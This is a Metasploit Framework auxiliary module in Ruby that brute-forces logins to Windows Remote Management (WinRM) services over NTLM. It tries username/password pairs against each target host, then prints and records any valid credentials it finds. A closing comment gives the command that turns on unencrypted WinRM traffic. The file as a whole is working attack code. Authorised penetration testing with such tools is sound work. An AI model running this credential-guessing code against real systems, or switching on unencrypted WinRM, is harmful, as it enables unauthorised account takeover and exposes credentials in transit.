##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex/proto/ntlm/message'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::WinRM
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'WinRM Login Utility',
			'Description'    => %q{
				This module attempts to authenticate to a WinRM service. It currently
				works only if the remote end allows Negotiate(NTLM) authentication.
				Kerberos is not currently supported.  Please note: in order to use this
				module without SSL, the 'AllowUnencrypted' winrm option must be set.
				Otherwise adjust the port and set the SSL options in the module as appropriate.
			},
			'Author'         => [ 'thelightcosine' ],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'        => MSF_LICENSE
		)

	end


	def run_host(ip)
		each_user_pass do |user, pass|
			resp = send_winrm_request(test_request)
			if resp.nil?
				print_error "#{ip}:#{rport}:  Got no reply from the server, connection may have timed out"
				return
			elsif  resp.code == 200
				cred_hash = {
					:host              => ip,
					:port              => rport,
					:sname          => 'winrm',
					:pass              => pass,
					:user              => user,
					:source_type => "user_supplied",
					:active            => true
				}
				report_auth_info(cred_hash)
				print_good "#{ip}:#{rport}:  Valid credential found: #{user}:#{pass}"
			elsif resp.code == 401
				print_error "#{ip}:#{rport}:  Login failed: #{user}:#{pass}"
			else
				print_error "Recieved unexpected Response Code: #{resp.code}"
			end
		end
	end


	def test_request
		data = winrm_wql_msg("Select Name,Status from Win32_Service")
	end

end

=begin
To set the AllowUncrypted option:
winrm set winrm/config/service @{AllowUnencrypted="true"}
=end
